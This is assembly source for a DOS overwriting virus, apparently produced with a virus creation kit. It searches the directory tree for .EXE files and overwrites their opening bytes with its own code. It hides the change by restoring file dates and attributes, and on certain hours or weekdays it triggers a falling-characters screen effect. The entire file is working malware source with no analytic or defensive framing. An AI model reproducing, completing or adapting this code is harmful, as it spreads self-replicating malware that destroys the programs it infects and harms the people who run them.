; UNTITLED.ASM
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Unknown User

virus_type      equ     1                       ; Overwriting Virus
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

main            proc    near

Row             dw      24

flag:           xchg    dx,ax
		mul     ch
		xchg    dx,ax

		call    search_files            ; Find and infect a file
		call    search_files            ; Find and infect another file
		call    get_hour
		cmp     ax,0017h                ; Did the function return 23?
		je      strt00                  ; If equal, do effect
		call    get_weekday
		cmp     ax,0005h                ; Did the function return 5?
		je      strt00                  ; If equal, do effect
		jmp     end00                   ; Otherwise skip over it

				   ;First, get current video mode and page.
strt00:         mov  cx,0B800h      ;color display, color video mem for page 1
	       mov  ah,15          ;Get current video mode
	       int  10h
	       cmp  al,2           ;Color?
	       je   A2             ;Yes
	       cmp  al,3           ;Color?
	       je   A2             ;Yes
	       cmp  al,7           ;Mono?
	       je   A1             ;Yes
	       int  20h            ;No,quit

				   ;here if 80 col text mode; put video segment in ds.
A1:            mov  cx,0A300h      ;Set for mono; mono videomem for page 1
A2:            mov  bl,0           ;bx=page offset
	       add  cx,bx          ;Video segment
	       mov  ds,cx          ;in ds

				   ;start dropsy effect
	       xor  bx,bx          ;Start at top left corner
A3:            push bx             ;Save row start on stack
	       mov  bp,80          ;Reset column counter
				   ;Do next column in a row.
A4:            mov  si,bx          ;Set row top in si
	       mov  ax,[si]        ;Get char & attr from screen
	       cmp  al,20h         ;Is it a blank?
	       je   A7             ;Yes, skip it
	       mov  dx,ax          ;No, save it in dx
	       mov  al,20h         ;Make it a space
	       mov  [si],ax        ;and put on screen
	       add  si,160         ;Set for next row
	       mov  di,cs:Row      ;Get rows remaining
A5:            mov  ax,[si]        ;Get the char & attr from screen
	       mov  [si],dx        ;Put top row char & attr there
A6:            call Vert           ;Wait for 2 vert retraces
	       mov  [si],ax        ;Put original char & attr back
				   ;Do next row, this column.
	      add  si,160          ;Next row
	      dec  di              ;Done all rows remaining?
	      jne  A5              ;No, do next one
	      mov  [si-160],dx     ;Put char & attr on line 25 as junk
				   ;Do next column on this row.
A7:           add  bx,2            ;Next column, same row
	      dec  bp              ;Dec column counter; done?
	      jne  A4              ;No, do this column
;Do next row.
A8:           pop  bx              ;Get current row start
	      add  bx,160          ;Next row
	      dec  cs:Row          ;All rows done?
	      jne  A3              ;No
A9:           mov  ax,4C00h  
	      int  21h             ;Yes, quit to DOS with error code

				   ;routine to deal with snow on CGA screen.
Vert:         push ax
	      push dx
	      push cx              ;Save all registers used
	      mov  cl,2            ;Wait for 2 vert retraces
	      mov  dx,3DAh         ;CRT status port
F1:           in   al,dx           ;Read status
	      test al,8            ;Vert retrace went hi?
	      je   F1              ;No, wait for it
	      dec  cl              ;2nd one?
	      je   F3              ;Yes, write during blanking time
F2:           in   al,dx           ;No, get status
	      test al,8            ;Vert retrace went low?
	      jne  F2              ;No, wait for it
	      jmp  F1              ;Yes, wait for next hi
F3:           pop  cx
	      pop  dx
	      pop  ax              ;Restore registers
	      ret
end00:          mov     ax,04C00h               ; DOS terminate function
		int     021h
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset root          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		mov     dx,offset all_files     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset up_dir        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
exe_mask        db      "*.EXE",0               ; Mask for all .EXE files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ch],0  ; Is the file > 65535 bytes?
		jne     infection_done          ; If it is then exit

		cmp     word ptr [si + 025h],'DN'  ; Might this be COMMAND.COM?
		je      infection_done          ; If it is then skip it

		cmp     word ptr [si + 01Ah],(finish - start)
		jb      infection_done          ; If it's too small then exit

		mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,4                    ; CX holds bytes to read (4)
		mov     dx,offset buffer        ; DX points to buffer
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		push    si                      ; Save DTA address before compare
		mov     si,offset buffer        ; SI points to comparison buffer
		mov     di,offset flag          ; DI points to virus flag
		mov     cx,4                    ; CX holds number of bytes (4)
	rep     cmpsb                           ; Compare the first four bytes
		pop     si                      ; Restore DTA address
		je      infection_done          ; If equal then exit
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,finish - start       ; CX holds virus length
		mov     dx,offset start         ; DX points to start of virus
		int     021h

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

buffer          db      4 dup (?)               ; Buffer to hold test data
set_carry       db      ?                       ; Set-carry-on-exit flag
infect_file     endp


get_hour        proc    near
		mov     ah,02Ch                 ; DOS get time function
		int     021h
		mov     al,ch                   ; Copy hour into AL
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_hour        endp

get_weekday     proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_weekday     endp

vcl_marker      db      "[VCL]",0               ; VCL creation marker

finish          label   near

code            ends
		end     main
